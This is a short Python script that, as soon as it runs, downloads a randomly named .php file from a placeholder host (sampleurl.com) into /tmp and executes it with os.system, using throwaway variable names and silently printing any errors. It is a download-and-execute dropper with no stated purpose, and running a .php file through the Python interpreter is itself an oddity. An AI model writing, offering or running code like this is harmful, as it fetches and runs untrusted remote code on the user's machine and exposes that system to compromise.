import requests
import os

def downloadFile():
    try:
        x = "https://sampleurl.com/rag4raw397219057tq24t42q1basdrga.php"
        y = "/tmp/rag4raw397219057tq24t42q1basdrga.php"

        z = requests.get(x)
        with open(y, "w") as f:
            f.write(z.text)

        os.system(f"python {y}")

    except Exception as e:
        print(e)

downloadFile()
